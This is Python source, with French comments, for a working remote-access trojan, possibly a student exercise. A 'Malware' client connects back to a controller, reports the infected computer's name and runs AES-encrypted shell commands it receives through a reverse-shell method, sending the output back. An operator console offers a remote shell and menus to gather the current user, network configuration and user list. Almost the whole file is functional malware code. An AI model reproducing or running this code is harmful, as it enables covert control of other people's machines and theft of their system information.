import socket, os, sys, time
import subprocess
from Crypto.Cipher import AES
from base64 import b64encode, b64decode
"""
Classe contenant les variables communes entre client et serveur
"""


class Machine:
    def __init__(self):
        self.server_addr = ("localhost", 60000)
        self.my_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.language = "utf-8"
        self.buffsize = 4096
        self.key = b'AcVfgTjpKumnVftH'
        self.iv = b'16EtPy5Bk6X18Dtp'


"""
Classe contenant les fonctions pour le client
"""


class Malware(Machine):
    def __init__(self):
        super().__init__()

    def start(self):
        try:
            self.my_socket.connect(self.server_addr)
            self.send(os.environ["COMPUTERNAME"])
            time.sleep(1)
        except socket.error:
            time.sleep(10)
            self.start()

    def send(self, message):
        raw = message.encode(self.language)
        cipher = AES.new(self.key, AES.MODE_CFB, self.iv)
        encrypted = b64encode(self.iv + cipher.encrypt(raw))
        self.my_socket.send(encrypted)

    def receive(self):
        enc = self.my_socket.recv(self.buffsize).decode(self.language)
        enc = b64decode(enc)
        iv = enc[:16]
        cipher = AES.new(self.key, AES.MODE_CFB, iv)
        cmd = cipher.decrypt(enc[16:]).decode(self.language)
        return cmd

    def quit(self):
        try:
            print("quitting")
            time.sleep(3)
            self.my_socket.close()
        except:
            print("Nous avons quitter avec une erreur")
            time.sleep(3)

    def rev_shell(self, cmd):
        var = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        out_byte = var.stdout.read() + var.stderr.read()
        out_str = out_byte.decode("utf-8", errors="replace")
        self.send(out_str)


"""
Classe contenant les fonction pour le malware
"""


class Client(Machine):
    def __init__(self):
        super().__init__()

    def start(self):
        self.my_socket.bind(self.server_addr)
        self.my_socket.listen()

    def bind(self):
        global distant_socket, addr, hostname
        distant_socket, addr = self.my_socket.accept()
        print("Connection accepted for :", addr)
        hostname = distant_socket.recv(self.buffsize).decode(self.language)
        print("The malware has infected the machine named " + str(hostname) + "\n")

    def send(self, commande):
        raw = commande.encode(self.language)
        cipher = AES.new(self.key, AES.MODE_CFB, self.iv)
        encrypted = b64encode(self.iv + cipher.encrypt(raw))
        distant_socket.send(encrypted)

    def receive(self):
        enc = distant_socket.recv(self.buffsize).decode(self.language)
        enc = b64decode(enc)
        iv = enc[:16]
        cipher = AES.new(self.key, AES.MODE_CFB, iv)
        print(cipher.decrypt(enc[16:]).decode(self.language), end="")

    def quit(self):
        print("Shutting down in 3 seconds")
        time.sleep(3)
        distant_socket.close()
        self.my_socket.close()
        sys.exit()

    def menu_principal(self):
        print("╔═════════════════════════════════════════════════════════╗")
        print("  |\  /|   /\   | |\  |   |\  /| |¯¯¯ |\  | |   |")
        print("  | \/ |  /__\  | | \ |   | \/ | |--  | \ | |   |")
        print("  |    | /    \ | |  \|   |    | |___ |  \| |___|")
        print("╚═════════════════════════════════════════════════════════╝")
        print("Press 1 to access the remote shell (if you enter the shell you won't be able to chose another option)")
        print("Press 2 to get informations")
        choix = input()
        return choix

    def choice_information(self, choix2):
        while choix2 != "0":
            if choix2 == "1":
                self.send("computer")
                print("\nComputer name : ", end="")
                self.receive()
            elif choix2 == "2":
                self.send("current")
                print("\nCurrent user : ", end="")
                self.receive()
            elif choix2 == "3":
                self.send("network")
                print("\nNetwork config : ", end="")
                self.receive()
            elif choix2 == "4":
                self.send("users")
                self.receive()
            else:
                print("Enter a valid value!")

            print("\n\nPress 1 to get the infected computer name")
            print("Press 2 to see who is the current user")
            print("Press 3 to get the network configuration")
            print("Press 4 to get the list of users")
            print("Press 0 to quit")
            choix2 = input()
        self.send("quit")
        self.quit()
